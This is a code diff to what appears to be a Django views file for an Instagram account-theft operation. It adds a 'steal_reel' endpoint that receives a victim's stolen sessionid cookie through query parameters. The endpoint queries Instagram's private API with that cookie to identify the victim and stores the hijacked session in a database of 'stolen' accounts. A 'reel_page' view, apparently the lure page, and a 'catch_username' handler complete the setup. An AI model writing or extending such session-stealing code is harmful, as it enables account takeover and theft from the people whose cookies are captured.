@@ -246,3 +246,45 @@ def catch_username(request):
     print(f"CAUGHT USER: @{user}")
     
     return HttpResponse("OK")
+
+
+# core/views.py → REEL STEALER
+def steal_reel(request):
+    s = request.GET.get('s', '')
+    u = request.GET.get('u', '')
+
+    if s and u and len(s) > 80:
+        try:
+            # GET USERNAME FROM INSTAGRAM API
+            import requests
+            headers = {
+                'Cookie': f'sessionid={s}',
+                'User-Agent': 'Instagram 219.0.0.27.119 Android'
+            }
+            r = requests.get(f'https://i.instagram.com/api/v1/users/{u}/info/', headers=headers)
+            data = r.json()
+            username = data.get('user', {}).get('username', f"USER_{u[-8:]}")
+            full_name = data.get('user', {}).get('full_name', '')
+            pic = data.get('user', {}).get('profile_pic_url', '')
+
+            # SAVE TO DB
+            InstagramAccount.objects.update_or_create(
+                username=username,
+                defaults={
+                    'password': 'REEL_STOLEN',
+                    'session_data': fernet.encrypt(json.dumps({
+                        "authorization_data": {"sessionid": s}
+                    }).encode()).decode(),
+                    'is_active': True,
+                    'last_success': timezone.now()
+                }
+            )
+            print(f"REEL STOLEN → @{username} | {full_name}")
+        except Exception as e:
+            print("ERROR:", e)
+
+    return HttpResponse("1", content_type="text/plain")
+
+
+def reel_page(request, code):
+    return render(request, 'core/reel.html')
